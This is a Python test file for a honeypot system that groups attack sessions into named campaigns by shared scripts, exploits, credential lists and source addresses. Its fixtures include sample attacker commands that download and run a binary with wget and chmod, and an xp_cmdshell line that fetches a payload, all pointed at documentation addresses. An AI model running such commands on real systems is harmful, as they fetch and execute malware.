"""Campaign clustering without a database: keys, the assignment plan, names and severity."""

from __future__ import annotations

import time
from datetime import UTC, datetime, timedelta

from ingest.campaigns.keys import (
    cap_keys,
    credlist_key,
    exploit_key,
    is_benign_host,
    script_key,
)
from ingest.campaigns.naming import campaign_name, max_severity, severity_of, stages_of
from ingest.campaigns.overlap import Overlap, overlap_merges, qualifies
from ingest.campaigns.plan import Cand, build_plan

T0 = datetime(2026, 10, 24, 10, 0, tzinfo=UTC)


def cand(sid: str, ip: str, *keys: tuple[str, str], minutes: int = 0) -> Cand:
    return Cand(
        session_id=sid,
        sensor="telnet",
        src_ip=ip,
        started_at=T0 + timedelta(minutes=minutes),
        last_event_at=T0 + timedelta(minutes=minutes, seconds=30),
        keys=set(keys),
    )


# ---- keys ------------------------------------------------------------------------------------


def test_script_key_needs_two_commands_and_ignores_addresses() -> None:
    a = script_key(["cd /tmp", "wget http://192.0.2.1/x86", "chmod 777 x86", "./x86"])
    b = script_key(["cd /var", "wget http://203.0.113.9:81/x86", "chmod 755 x86", "./x86"])
    assert a is not None
    assert a == b
    assert script_key(["uname -a"]) is None
    assert script_key(["cd /tmp", "pwd", "uname -a"]) is None


def test_exploit_key_ignores_volatile_parts_but_not_the_shape() -> None:
    a = exploit_key("http_request", "post", "/up.php?id=12&x=1", "a=1&b=2")
    b = exploit_key("http_request", "POST", "/up.php?id=99&x=7", "a=9&b=8")
    c = exploit_key("http_request", "POST", "/up.php?id=99&x=7", "c=1")
    assert a == b
    assert a != c
    sql_a = exploit_key("command", "", "", "EXEC xp_cmdshell 'wget http://192.0.2.5/a'")
    sql_b = exploit_key("command", "", "", "exec xp_cmdshell 'wget http://203.0.113.9/a'")
    assert sql_a == sql_b


def test_credlist_key_is_order_independent_and_needs_a_list() -> None:
    pairs = [(f"user{i}", f"pw{i}") for i in range(40)]
    assert credlist_key(pairs) == credlist_key(list(reversed(pairs)))
    assert credlist_key(pairs[:5]) is None
    assert credlist_key(pairs[:25]) is not None


def test_benign_hosts() -> None:
    assert is_benign_host("raw.githubusercontent.com")
    assert is_benign_host("GitHub.com.")
    assert not is_benign_host("evilgithub.com")
    assert not is_benign_host("dl.example.net")


# ---- plan ------------------------------------------------------------------------------------

K1 = ("script", "aa")
K2 = ("payload_host", "dl.example.net")
K3 = ("family", "mirai")
NETS = ("192.0.2", "198.51.100", "203.0.113")


def ip(i: int) -> str:
    """Addresses in three different /24 networks (the documentation ranges), cycling."""
    return f"{NETS[i % 3]}.{i + 1}"


def test_a_key_from_two_networks_founds_a_campaign() -> None:
    plan = build_plan([cand("a", ip(0), K1), cand("b", ip(1), K1)], {}, {}, 2)
    assert plan.groups == [["a", "b"]]
    assert plan.group_keys == [{K1}]
    assert plan.joins == {}


def test_one_source_or_one_network_does_not_found_a_campaign() -> None:
    one_ip = build_plan([cand("a", "192.0.2.1", K1), cand("b", "192.0.2.1", K1)], {}, {}, 2)
    one_net = build_plan([cand("a", "192.0.2.1", K1), cand("b", "192.0.2.2", K1)], {}, {}, 2)
    assert one_ip.groups == []
    assert one_net.groups == []


def test_credlist_needs_three_networks() -> None:
    key = ("credlist", "cc")
    two = build_plan([cand("a", ip(0), key), cand("b", ip(1), key)], {}, {}, 2)
    three = build_plan([cand(s, ip(i), key) for i, s in enumerate("abc")], {}, {}, 2)
    assert two.groups == []
    assert three.groups == [["a", "b", "c"]]


def test_a_mapped_key_makes_the_session_join_even_from_one_source() -> None:
    plan = build_plan([cand("a", ip(0), K1)], {K1: 7}, {7: (T0, 7)}, 2)
    assert plan.joins == {"a": 7}
    assert plan.groups == []
    assert plan.persist == {7: {K1}}


def order(*ids: int) -> dict[int, tuple[datetime, int]]:
    return {cid: (T0 - timedelta(days=100 - cid), cid) for cid in ids}


def test_strong_keys_of_two_campaigns_merge_into_the_oldest() -> None:
    sources = {K1: 2, K2: 2}
    bridges = [cand("a", ip(0), K1, K2), cand("b", ip(1), K1, K2, minutes=1)]
    plan = build_plan(bridges, {K1: 3, K2: 9}, order(3, 9), 2, key_sources=sources)
    assert plan.merges == [(9, 3)]
    assert plan.joins == {"a": 3, "b": 3}


def test_one_network_holding_both_keys_does_not_merge_two_strong_campaigns() -> None:
    sources = {K1: 2, K2: 2}
    same_ip = [cand(f"s{i}", "192.0.2.9", K1, K2, minutes=i) for i in range(20)]
    same_net = [cand(f"n{i}", f"192.0.2.{i + 10}", K1, K2, minutes=i) for i in range(20)]
    for sessions in (same_ip, same_net):
        plan = build_plan(sessions, {K1: 3, K2: 9}, order(3, 9), 2, key_sources=sources)
        assert plan.merges == []
        assert set(plan.joins.values()) == {3}  # they still join the oldest campaign


def test_a_weak_key_never_bridges_two_campaigns() -> None:
    # K2 was seen from one source only: the session joins the oldest campaign, nothing merges.
    plan = build_plan(
        [cand("a", ip(0), K1, K2)], {K1: 3, K2: 9}, order(3, 9), 2, key_sources={K1: 2, K2: 1}
    )
    assert plan.merges == []
    assert plan.joins == {"a": 3}


def test_one_session_causes_at_most_one_merge() -> None:
    keys = {("payload_host", f"c{i}"): i for i in range(1, 17)}
    sources = dict.fromkeys(keys, 5)
    evil = [cand("evil1", ip(0), *keys), cand("evil2", ip(1), *keys, minutes=1)]
    plan = build_plan(evil, dict(keys), order(*range(1, 17)), 2, key_sources=sources)
    assert len(plan.merges) <= len(evil)  # one merge per bridging session, never more


def test_merge_budget_still_lets_the_session_join_without_merging() -> None:
    sources = {K1: 2, K2: 2}
    bridges = [cand("a", ip(0), K1, K2), cand("b", ip(1), K1, K2, minutes=1)]
    plan = build_plan(bridges, {K1: 3, K2: 9}, order(3, 9), 2, merge_budget=0, key_sources=sources)
    assert plan.merges == []
    assert len(plan.joins) == 2


def test_sessions_linked_by_different_strong_keys_share_one_campaign() -> None:
    sessions = [
        cand("a", ip(0), K1),
        cand("b", ip(1), K1, K2),
        cand("c", ip(2), K2),
        cand("z", ip(3), K3),
    ]
    plan = build_plan(sessions, {}, {}, 2)
    assert plan.groups == [["a", "b", "c"]]
    assert plan.group_keys == [{K1, K2}]


def test_a_joined_session_pulls_in_earlier_sessions_with_its_strong_keys() -> None:
    sessions = [cand("a", ip(0), K2, minutes=0), cand("b", ip(1), K1, K2, minutes=5)]
    plan = build_plan(sessions, {K1: 4}, {4: (T0, 4)}, 2)
    assert plan.joins == {"a": 4, "b": 4}


def test_a_joining_session_does_not_teach_the_campaign_weak_keys() -> None:
    plan = build_plan([cand("a", ip(0), K1, K2)], {K1: 4}, {4: (T0, 4)}, 2)
    assert plan.persist == {4: {K1}}  # K2 came from one source: not stored


def test_the_plan_is_linear_on_a_long_chain() -> None:
    n = 3000
    cands = [
        cand(
            f"s{i:05d}", ip(i), ("payload_host", f"h{i}"), ("payload_host", f"h{i + 1}"), minutes=i
        )
        for i in range(n)
    ]
    start = time.monotonic()
    plan = build_plan(cands, {("payload_host", f"h{n}"): 1}, {1: (T0, 1)}, 2, 50)
    assert time.monotonic() - start < 3.0
    assert len(plan.joins) == n


# ---- naming ----------------------------------------------------------------------------------


def test_names_follow_family_then_objective_then_sensor() -> None:
    assert campaign_name(["mirai"], ["mirai"], ["telnet"], 41) == "Mirai loader over Telnet #41"
    assert (
        campaign_name([], ["crypto-miner", "recon"], ["ssh"], 7) == "Crypto-miner drop over SSH #7"
    )
    assert campaign_name([], [], ["web"], None) == "Shared activity over HTTP"
    assert campaign_name(["Evil<script>"], [], [], 1) == "Evilscript campaign #1"


def test_a_campaign_that_did_several_things_names_the_two_goals() -> None:
    # Credential stuffing, then a dropper, then a ransom note: the story is not just the dropper.
    tags = ["credential-stuffing", "malware-drop", "db-ransom", "recon"]
    assert (
        campaign_name([], tags, ["mysql"], 3) == "Malware dropper and database ransom over MySQL #3"
    )
    assert campaign_name([], ["php2shell", "malware-drop"], ["web"], 5) == (
        "PHP2Shell exploitation and malware dropper over HTTP #5"
    )


def test_a_goal_the_main_one_implies_is_not_named_twice() -> None:
    assert campaign_name([], ["mirai", "malware-drop"], ["telnet"], 4) == (
        "Mirai-style loader over Telnet #4"
    )
    assert campaign_name([], ["crypto-miner", "malware-drop"], ["ssh"], 6) == (
        "Crypto-miner drop over SSH #6"
    )
    assert campaign_name([], ["synology-exploit", "c3rb3r"], ["synology"], 8) == (
        "Synology NAS exploitation over Synology NAS #8"
    )


def test_guessing_passwords_or_looking_around_is_not_a_second_goal() -> None:
    tags = ["credential-stuffing", "weak-credentials", "recon", "scanner"]
    assert campaign_name([], tags, ["ssh"], 2) == "Credential stuffing over SSH #2"
    assert campaign_name(["Gafgyt"], ["mirai", "db-ransom"], ["telnet"], 9) == (
        "Gafgyt loader over Telnet #9"
    )


def test_severity_and_stages() -> None:
    assert severity_of(["php2shell"]) == "severe"
    assert severity_of(["db-ransom"]) == "warning"
    assert severity_of([], commands=2) == "warning"
    assert severity_of([], login_attempts=3) == "notice"
    assert severity_of([]) == "info"
    assert max_severity("notice", "severe", "warning") == "severe"
    assert max_severity("warning", "notice") == "warning"
    assert max_severity() == "info"
    stages = {"T1105": "tool_transfer", "T1082": "recon", "T1496": "objective"}
    assert stages_of(["T1496", "T1082", "T1105", "T0000"], stages) == [
        "recon",
        "tool_transfer",
        "objective",
    ]


def test_a_session_carries_a_bounded_number_of_keys_per_kind() -> None:
    many = {("payload_host", f"h{i}.example.net") for i in range(30)}
    many |= {("script", f"s{i}") for i in range(5)} | {("exploit", f"e{i}") for i in range(9)}
    kept = cap_keys(many)

    def count(kind: str) -> int:
        return sum(1 for k in kept if k[0] == kind)

    assert (count("payload_host"), count("script"), count("exploit")) == (4, 1, 3)
    assert cap_keys(many) == kept  # deterministic


# ---- merging by shared source addresses -------------------------------------------------------


def pool(n: int) -> list[str]:
    """``n`` distinct addresses from the three documentation networks."""
    return [f"{NETS[i % 3]}.{i // 3 + 1}" for i in range(n)]


def overlaps(sets: dict[int, set[str]]) -> list[Overlap]:
    ids = sorted(sets)
    return [
        Overlap(a, b, len(sets[a] & sets[b]), len(sets[a]), len(sets[b]))
        for i, a in enumerate(ids)
        for b in ids[i + 1 :]
        if sets[a] & sets[b]
    ]


def test_one_actor_split_by_kind_merges_into_the_oldest_campaign() -> None:
    # Credential stuffing, a dropper, a ransom note and more: seven campaigns, the same 31 or 32
    # addresses, and no session that carries two of their keys.
    actor = pool(32)
    sets = {cid: set(actor if cid % 2 else actor[:31]) for cid in range(3, 10)}
    merges = overlap_merges(overlaps(sets), order(*sets))
    assert sorted(merges) == [(cid, 3) for cid in range(4, 10)]


def test_loader_clusters_with_heavy_overlap_merge_even_when_the_ends_barely_touch() -> None:
    addresses = pool(80)
    sets = {
        1: set(addresses[0:36]),
        2: set(addresses[0:44]),
        3: set(addresses[10:62]),
        4: set(addresses[19:80]),  # 61 addresses
    }
    assert not qualifies(Overlap(1, 4, 17, 36, 61))  # 17 of 36: the two ends alone do not merge
    merges = overlap_merges(overlaps(sets), order(1, 2, 3, 4))
    assert {loser for loser, _ in merges} == {2, 3, 4}
    parent = dict(merges)  # loser -> winner: a winner may lose later, the oldest never does
    survivors = set()
    for cid in sets:
        while cid in parent:
            cid = parent[cid]
        survivors.add(cid)
    assert survivors == {1}


def test_unrelated_actors_do_not_merge() -> None:
    a, b, c = pool(90)[:40], pool(90)[40:90], pool(90)[36:76]
    few = overlaps({1: set(a), 2: set(b)})
    assert few == []  # no address in common
    assert overlap_merges(few, order(1, 2)) == []
    # Four addresses in common: a shared jump host, not one actor.
    four = overlaps({1: set(a), 3: set(c)})
    assert [o.shared for o in four] == [4]
    assert overlap_merges(four, order(1, 3)) == []
    # Many addresses in common, but half of the smaller campaign only: still not one actor.
    assert overlap_merges([Overlap(1, 2, 20, 40, 100)], order(1, 2)) == []
    assert overlap_merges([Overlap(1, 2, 24, 40, 100)], order(1, 2)) == [(2, 1)]


def test_a_handful_of_addresses_is_not_enough_evidence() -> None:
    assert not qualifies(Overlap(1, 2, 4, 5, 5))  # all of the smaller one, but only four
    assert qualifies(Overlap(1, 2, 5, 6, 90))  # five addresses, 5/6 of the smaller campaign
    assert not qualifies(Overlap(1, 2, 5, 12, 12))  # five, but under 60 %
    assert not qualifies(Overlap(1, 1, 50, 50, 50))  # never with itself
    assert overlap_merges([Overlap(1, 2, 5, 6, 90)], order(1, 2)) == [(2, 1)]


def test_the_oldest_survives_and_a_merged_winner_can_lose_later() -> None:
    # Campaign 5 is the oldest, 2 the youngest. The strongest pair goes first.
    ages = {5: (T0 - timedelta(days=9), 5), 3: (T0 - timedelta(days=5), 3), 2: (T0, 2)}
    pairs = [Overlap(2, 3, 10, 10, 10), Overlap(3, 5, 8, 10, 10)]
    assert overlap_merges(pairs, ages) == [(2, 3), (3, 5)]
    # Both directions of one pair count once.
    assert overlap_merges([Overlap(5, 3, 8, 10, 10), Overlap(3, 5, 8, 10, 10)], ages) == [(3, 5)]


def test_the_merge_budget_and_unknown_campaigns() -> None:
    pairs = [Overlap(1, cid, 9, 10, 10) for cid in (2, 3, 4)]
    assert len(overlap_merges(pairs, order(1, 2, 3, 4), budget=2)) == 2
    assert overlap_merges(pairs, order(1, 2), budget=5) == [(2, 1)]  # 3 and 4 are not live
    assert overlap_merges([], {}) == []
